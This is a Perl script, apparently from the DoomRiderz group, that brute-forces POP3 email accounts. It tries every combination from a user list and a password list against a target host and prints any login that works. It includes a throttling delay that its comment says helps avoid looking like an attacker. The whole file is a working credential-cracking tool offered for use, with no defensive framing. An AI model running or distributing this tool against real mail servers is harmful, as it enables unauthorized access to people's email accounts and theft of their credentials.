#!/usr/bin/perl 
################################################################################
# POPER - Pop3 Email Cracker
# by-free0n
# free0n.host.sk
# DoomRiderz - doomriderz.co.nr
# usage: perl poper.pl
################################################################################
# This is a pop3 brute force dictionary attacker that can
# read a list of users or specified user and run a password
# list attack against them. The brute forcer has a delay option
# which makes it not clog up the server with to many connections
# the option is defaulted to 10 seconds but can be changed for longer
# iterations. 
################################################################################
use Net::POP3;

#default variable options
my $host = "localhost";
my $delay = "10";
my $account = "";
my $status = "1";

#arrays we use to store the usernames and passwords
#from the files
@users = ();
@passes = ();

#this is the name of the user and pass list
#by default it looks in the current directory as
#the script. So you will need to have a user list
#called users and a password list call pass
$user_list = 'users'; 
$pass_list = 'pass';

#variable is used to call clear which clears our screen
my $clear = '/usr/bin/clear';

#clear the terminal screen and write out the pretty banner :)
sub CLANSCR { 
   open (CLEAR, "|$clear");
   close (CLEAR);
   
   print "-----------------------------------------------------------------n";
   print "POPER POP3 Email Attackern";
   print "by-free0nn";
   print "DoomRiderz - doomriderz.co.nrn";
   print "Usage: perl poper.pln";
   print "------------------------------------------------------------------n";
};

#input gathers all the user input we need to launch the 
#attack
sub INPUT {
   print "Please enter the host:"; 
   $host = <STDIN>;
   chomp $host;

   print "Login Delay (10 seconds default):";
   $delay = <STDIN>;
   chomp $delay;

   print "Do you know a user account? [y/n]:";
   $account = <STDIN>;
   chomp $account;

   if($account eq "y") {
      print "Please enter the user account:";
      $account = <STDIN>;
      chomp $account;
   } else {
      $account = "";
   }
  
   print "Would you like to display accounts being tried? [y/n]:";
   $status = <STDIN>;
   chomp $status;
   
   if($host eq "") {
      die("No host specified aborting!");
   }
   if($delay eq "") {
      $delay = 10;
   }
   
   print "Starting the Attack! please wait for status update...n";
};

#call our subs this is more of the main
#start of the application..
&CLANSCR;
&INPUT;

#try and open the pass file
open (PASS, "$pass_list") or 
   die "Can't find the pass file abort!nn";

#we decide if we are going to load the userlist or 
#an account specified in the options
if($account eq "") {
   open (USER, "$user_list") or
      die "Can't find the user file abort!nn";

   while($uline = <USER>) {
      ($user) = split(" ",$uline);
      push @users, "$user";
   }
   close(USER);

} else {
   push @users, "$account";
}

#store passwords in list
while ($pline = <PASS>) { 
   ($pass) = split(" ",$pline);
   push @passes, "$pass";
}
close(PASS);


foreach $user (@users) {

   foreach $pass (@passes) {
      
      #this little countdown script is what causes the delay
      #the delay is useful so we don't overload the server at once
      #but can kind of test the account one per minute or one per hour
      #kind of making us less seem like a hacker i guess....
      if($delay > 0) {
         $countdown = $delay;
         while($countdown > 0) {
            sleep 1;
            --$countdown;
         }
      }
      
      #connect to the host
      $pop = Net::POP3->new($host, Timeout => 60)
	 or die("couldn't connect to host:" . $host);
      
      #display status of accounts that are being tested
      if($status eq "1" or $status eq "y") {
	 print "Trying " .$user . " password " . $pass . "n";
      }

      if($pop->login($user, $pass)) {
         #let the user know we found an account, a sets of the terminal bell       
         print "a";
         print "--------------------------------------------------------------n";
         print "Login foundn";
         print "--------------------------------------------------------------n";
         print "username:" . $user . "n";
         print "password:" . $pass . "n";
         print "--------------------------------------------------------------n";
         exit;
      }

      $pop->quit();
   }
}

